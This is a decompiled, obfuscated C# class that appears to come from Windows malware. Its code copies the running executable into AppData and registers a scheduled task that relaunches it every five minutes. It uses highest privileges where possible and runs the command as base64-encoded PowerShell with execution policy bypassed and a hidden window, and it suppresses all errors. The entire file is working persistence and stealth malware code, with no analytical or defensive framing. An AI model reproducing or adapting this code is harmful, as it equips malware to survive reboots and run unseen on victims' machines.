using System;
using System.Diagnostics;
using System.IO;
using System.Text;

// Token: 0x02000012 RID: 18
internal class Class8
{
	// Token: 0x06000052 RID: 82 RVA: 0x00008A50 File Offset: 0x00006C50
	internal static void pwfVayjWiK()
	{
		try
		{
			string text = Class4.h();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			if (!text.ToLower().Contains(folderPath.ToLower()))
			{
				string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Path.GetFileName(text));
				if (!(text.ToLower() == text2.ToLower()))
				{
					try
					{
						if (!Class9.gclass3_0.String_2.smethod_0() && !Class9.gclass3_0.String_3.smethod_0())
						{
							text2 = Path.Combine(Environment.GetEnvironmentVariable(Class9.gclass3_0.String_3), Class9.gclass3_0.String_2);
						}
						if (text.ToLower() == text2.ToLower())
						{
							return;
						}
					}
					catch
					{
					}
					Class8.smethod_0();
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000053 RID: 83 RVA: 0x00008B34 File Offset: 0x00006D34
	private static void smethod_0()
	{
		string path = Class4.h();
		string text = Path.GetFileNameWithoutExtension(path);
		string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Path.GetFileName(text));
		try
		{
			if (!Class9.gclass3_0.String_2.smethod_0())
			{
				text = Class9.gclass3_0.String_2;
			}
		}
		catch
		{
		}
		try
		{
			if (!Class9.gclass3_0.String_3.smethod_0())
			{
				text2 = Path.Combine(Environment.GetEnvironmentVariable(Class9.gclass3_0.String_3), Path.GetFileName(text));
			}
		}
		catch
		{
		}
		string s = string.Concat(new string[]
		{
			"Register-ScheduledTask -TaskName '",
			text,
			"' -Action (New-ScheduledTaskAction -Execute '",
			text2,
			"') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)) -User $env:UserName -RunLevel Highest -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Force"
		});
		if (!Class4.smethod_4())
		{
			goto IL_116;
		}
		IL_A7:
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			FileName = "powershell.exe",
			Arguments = "-NoProfile -ExecutionPolicy Bypass -Enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(s)),
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		using (Process process = new Process
		{
			StartInfo = startInfo
		})
		{
			process.Start();
			process.WaitForExit();
			goto IL_148;
		}
		goto IL_116;
		IL_148:
		FileStream fileStream = new FileStream(text2, FileMode.OpenOrCreate, FileAccess.Write);
		byte[] array = File.ReadAllBytes(path);
		fileStream.Write(array, 0, array.Length);
		fileStream.Flush();
		return;
		IL_116:
		s = string.Concat(new string[]
		{
			"Register-ScheduledTask -TaskName '",
			text,
			"' -Action (New-ScheduledTaskAction -Execute '",
			text2,
			"') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)) -User $env:UserName -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Force"
		});
		goto IL_A7;
	}

	// Token: 0x06000055 RID: 85 RVA: 0x00002308 File Offset: 0x00000508
	// Note: this type is marked as 'beforefieldinit'.
	static Class8()
	{
		Class16.kLjw4iIsCLsZtxc4lksN0j();
	}

	// Token: 0x06000056 RID: 86 RVA: 0x0000242E File Offset: 0x0000062E
	internal static bool smethod_1()
	{
		return Class8.object_0 == null;
	}

	// Token: 0x0400002C RID: 44
	private static object object_0;
}
